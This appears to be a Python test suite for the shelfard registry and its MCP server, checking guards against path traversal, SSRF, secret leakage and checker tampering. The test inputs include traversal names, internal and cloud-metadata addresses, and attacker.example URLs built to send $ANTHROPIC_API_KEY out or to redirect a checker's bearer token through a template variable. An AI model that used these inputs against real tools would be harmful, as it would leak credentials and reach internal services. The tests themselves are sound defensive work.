"""
Security tests: path-traversal guards, MCP write-tool gating, env-var allowlist,
SSRF protection, and checker/var tamper guards.

Run: conda run -n shelfard python3 tests/security_tests.py
"""

import asyncio
import json
import os
import socket
import sys
import tempfile
import traceback
import unittest.mock as mock
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from shelfard import LocalFileRegistry
from shelfard import registry
from shelfard import mcp_server
from shelfard.models import RestCheckerConfig, TableSchema, ColumnSchema, ColumnType
from shelfard.security import check_url_safe, check_env_allowed, validate_name

# ─────────────────────────────────────────────
# Minimal test framework
# ─────────────────────────────────────────────

passed = 0
failed = 0
errors = []


def test(name, fn):
    global passed, failed
    try:
        fn()
        print(f"  ✓ {name}")
        passed += 1
    except AssertionError as e:
        print(f"  ✗ {name}")
        errors.append((name, str(e)))
        failed += 1
    except Exception:
        print(f"  ✗ {name} [ERROR]")
        errors.append((name, traceback.format_exc()))
        failed += 1


def section(name):
    print(f"\n── {name} ──")


def _fake_dns(ip):
    """Patch socket.getaddrinfo to resolve every host to ``ip``."""
    family = socket.AF_INET6 if ":" in ip else socket.AF_INET
    return mock.patch(
        "shelfard.security.socket.getaddrinfo",
        return_value=[(family, socket.SOCK_STREAM, 6, "", (ip, 443))],
    )


class _isolated_default_registry:
    """Point the module-level default registry (used by the MCP tools) at a temp dir."""

    def __enter__(self):
        self._tmp = tempfile.TemporaryDirectory()
        self._orig = registry._default._root
        registry._default._root = Path(self._tmp.name)
        return Path(self._tmp.name)

    def __exit__(self, *exc):
        registry._default._root = self._orig
        self._tmp.cleanup()


def _schema(name="users"):
    return TableSchema(
        table_name=name,
        columns=[ColumnSchema(name="id", col_type=ColumnType.INTEGER, nullable=False)],
    )


# ─────────────────────────────────────────────
# Name validation / path traversal
# ─────────────────────────────────────────────

section("Path traversal")

BAD_NAMES = ["../evil", "..", "a/b", "/etc/passwd", "..\\x", ".hidden", "-x", "", "a" * 200, "x..y"]


def test_validate_name_rejects_bad():
    for n in BAD_NAMES:
        assert validate_name(n) is not None, f"{n!r} should be rejected"


def test_validate_name_accepts_good():
    for n in ["users", "todo_api", "orders-v2", "pg.orders", "A1"]:
        assert validate_name(n) is None, f"{n!r} should be accepted"


def test_register_checker_traversal_blocked():
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp) / "reg"
        r = LocalFileRegistry(root)
        cfg = RestCheckerConfig(schema_name="../../pwned", url="https://example.com", headers=[], env=[])
        res = r.register_checker("../../pwned", cfg)
        assert not res.success
        assert not (Path(tmp) / "pwned.json").exists()
        assert not any(Path(tmp).rglob("pwned.json"))


def test_register_schema_traversal_blocked():
    with tempfile.TemporaryDirectory() as tmp:
        r = LocalFileRegistry(Path(tmp) / "reg")
        res = r.register_schema("../outside", _schema())
        assert not res.success
        assert not any(Path(tmp).rglob("outside.json"))


def test_subscribe_consumer_traversal_blocked():
    with tempfile.TemporaryDirectory() as tmp:
        r = LocalFileRegistry(Path(tmp) / "reg")
        assert r.register_schema("users", _schema()).success
        res = r.subscribe_consumer("../../evil", "users")
        assert not res.success
        assert not (Path(tmp) / "evil").exists()


def test_get_checker_traversal_blocked():
    with tempfile.TemporaryDirectory() as tmp:
        secret = Path(tmp) / "secret.json"
        secret.write_text('{"schema_name": "x", "url": "leak"}')
        r = LocalFileRegistry(Path(tmp) / "reg")
        res = r.get_checker("../../secret")
        assert not res.success and "leak" not in json.dumps(res.data or {})


def test_get_schema_traversal_blocked():
    with tempfile.TemporaryDirectory() as tmp:
        r = LocalFileRegistry(Path(tmp) / "reg")
        res = r.get_registered_schema("../../../etc/passwd")
        assert not res.success and "Invalid" in res.error


def test_set_var_rejects_bad_name():
    with tempfile.TemporaryDirectory() as tmp:
        r = LocalFileRegistry(tmp)
        assert not r.set_var("bad-name", "x").success
        assert not r.set_var("1abc", "x").success
        assert r.set_var("good_name", "x").success


def test_checker_schema_name_mismatch_rejected():
    with tempfile.TemporaryDirectory() as tmp:
        r = LocalFileRegistry(tmp)
        cfg = RestCheckerConfig(schema_name="other", url="https://example.com", headers=[], env=[])
        assert not r.register_checker("users", cfg).success


for fn in [
    test_validate_name_rejects_bad, test_validate_name_accepts_good,
    test_register_checker_traversal_blocked, test_register_schema_traversal_blocked,
    test_subscribe_consumer_traversal_blocked, test_get_checker_traversal_blocked,
    test_get_schema_traversal_blocked, test_set_var_rejects_bad_name,
    test_checker_schema_name_mismatch_rejected,
]:
    test(fn.__name__, fn)


# ─────────────────────────────────────────────
# SSRF / env allowlist primitives
# ─────────────────────────────────────────────

section("SSRF + env allowlist")


def test_url_rejects_non_http_scheme():
    assert check_url_safe("file:///etc/passwd", allow_private=False)
    assert check_url_safe("gopher://x", allow_private=False)


def test_url_rejects_internal_addresses():
    for ip in ["127.0.0.1", "10.0.0.5", "192.168.1.1", "169.254.169.254", "::1", "0.0.0.0",
               "::ffff:127.0.0.1"]:
        with _fake_dns(ip):
            assert check_url_safe("https://h.example", allow_private=False), ip


def test_url_accepts_public_address():
    with _fake_dns("93.184.216.34"):
        assert check_url_safe("https://example.com/api", allow_private=False) is None


def test_url_private_allowed_by_env():
    with mock.patch.dict(os.environ, {"SHELFARD_MCP_ALLOW_PRIVATE_HOSTS": "1"}):
        assert check_url_safe("http://localhost:8080") is None


def test_env_allowlist():
    with mock.patch.dict(os.environ, {"SHELFARD_MCP_ENV_ALLOWLIST": "BEARER_TOKEN"}, clear=False):
        assert check_env_allowed(["SHELFARD_TOKEN", "BEARER_TOKEN"]) is None
        err = check_env_allowed(["ANTHROPIC_API_KEY"])
        assert err and "ANTHROPIC_API_KEY" in err


for fn in [
    test_url_rejects_non_http_scheme, test_url_rejects_internal_addresses,
    test_url_accepts_public_address, test_url_private_allowed_by_env, test_env_allowlist,
]:
    test(fn.__name__, fn)


# ─────────────────────────────────────────────
# MCP server
# ─────────────────────────────────────────────

section("MCP server")


def _tool_names(server):
    return {t.name for t in asyncio.run(server.list_tools())}


def test_write_tools_hidden_by_default():
    names = _tool_names(mcp_server.build_server())
    assert "get_schema" in names and "live_check_schema" in names
    assert not names & {"register_checker", "set_template_var", "delete_template_var"}, names


def test_write_tools_exposed_with_flag():
    names = _tool_names(mcp_server.build_server(allow_writes=True))
    assert {"register_checker", "set_template_var", "delete_template_var"} <= names


def test_mcp_register_blocks_secret_exfiltration():
    """The original attack: send ANTHROPIC_API_KEY to an attacker URL."""
    with _isolated_default_registry() as root, _fake_dns("93.184.216.34"):
        out = json.loads(mcp_server.register_checker(
            "x",
            "https://attacker.example/?k=$ANTHROPIC_API_KEY",
            env='["ANTHROPIC_API_KEY"]',
        ))
        assert not out["success"] and "ANTHROPIC_API_KEY" in out["error"]
        assert not (root / "checkers" / "x.json").exists()


def test_mcp_register_blocks_undeclared_env_ref():
    with _isolated_default_registry(), _fake_dns("93.184.216.34"):
        out = json.loads(mcp_server.register_checker(
            "x", "https://api.example/", headers='[{"Authorization": "$AWS_SECRET_ACCESS_KEY"}]',
        ))
        assert not out["success"] and "AWS_SECRET_ACCESS_KEY" in out["error"]


def test_mcp_register_blocks_ssrf():
    with _isolated_default_registry(), _fake_dns("169.254.169.254"):
        out = json.loads(mcp_server.register_checker("x", "http://metadata.example/latest"))
        assert not out["success"] and "internal" in out["error"]


def test_mcp_register_blocks_traversal():
    with _isolated_default_registry(), _fake_dns("93.184.216.34"):
        out = json.loads(mcp_server.register_checker("../../x", "https://api.example/"))
        assert not out["success"] and "Invalid" in out["error"]


def test_mcp_register_rejects_malformed_json():
    with _isolated_default_registry():
        out = json.loads(mcp_server.register_checker("x", "https://api.example/", env="nope"))
        assert not out["success"]
        out = json.loads(mcp_server.register_checker("x", "https://api.example/", headers='[1]'))
        assert not out["success"]


def test_mcp_register_allowed_checker():
    with _isolated_default_registry() as root, _fake_dns("93.184.216.34"):
        out = json.loads(mcp_server.register_checker(
            "users", "https://api.example/users",
            env='["SHELFARD_API_TOKEN"]',
            headers='[{"Authorization": "Bearer $SHELFARD_API_TOKEN"}]',
        ))
        assert out["success"], out
        assert (root / "checkers" / "users.json").exists()


def test_mcp_register_cannot_overwrite():
    with _isolated_default_registry(), _fake_dns("93.184.216.34"):
        registry.register_checker(
            "users", RestCheckerConfig(schema_name="users", url="https://real.example/users", headers=[], env=[]),
        )
        out = json.loads(mcp_server.register_checker("users", "https://attacker.example/"))
        assert not out["success"] and "already exists" in out["error"]
        assert registry.get_checker("users").data["checker"]["url"] == "https://real.example/users"


def test_mcp_cannot_redirect_checker_via_template_var():
    with _isolated_default_registry():
        registry.set_var("api_host", "https://real.example")
        registry.register_checker(
            "users",
            RestCheckerConfig(
                schema_name="users", url="{{api_host}}/users",
                headers=[{"Authorization": "$TOKEN"}], env=["TOKEN"],
            ),
        )
        out = json.loads(mcp_server.set_template_var("api_host", "https://attacker.example"))
        assert not out["success"] and "used by a registered checker" in out["error"]
        out = json.loads(mcp_server.delete_template_var("api_host"))
        assert not out["success"]
        assert registry.get_var("api_host").data["value"] == "https://real.example"
        # unrelated vars are still settable
        assert json.loads(mcp_server.set_template_var("unused", "v"))["success"]


for fn in [
    test_write_tools_hidden_by_default, test_write_tools_exposed_with_flag,
    test_mcp_register_blocks_secret_exfiltration, test_mcp_register_blocks_undeclared_env_ref,
    test_mcp_register_blocks_ssrf, test_mcp_register_blocks_traversal,
    test_mcp_register_rejects_malformed_json, test_mcp_register_allowed_checker,
    test_mcp_register_cannot_overwrite, test_mcp_cannot_redirect_checker_via_template_var,
]:
    test(fn.__name__, fn)


# ─────────────────────────────────────────────
# Summary
# ─────────────────────────────────────────────

total = passed + failed
print(f"\n{'='*50}")
print(f"Results: {passed}/{total} passed", end="")
if failed:
    print(f"  ({failed} failed)")
    print("\nFailures:")
    for name, err in errors:
        print(f"\n  ✗ {name}")
        print(f"    {err}")
else:
    print(" ✓")
print('='*50)
sys.exit(0 if failed == 0 else 1)
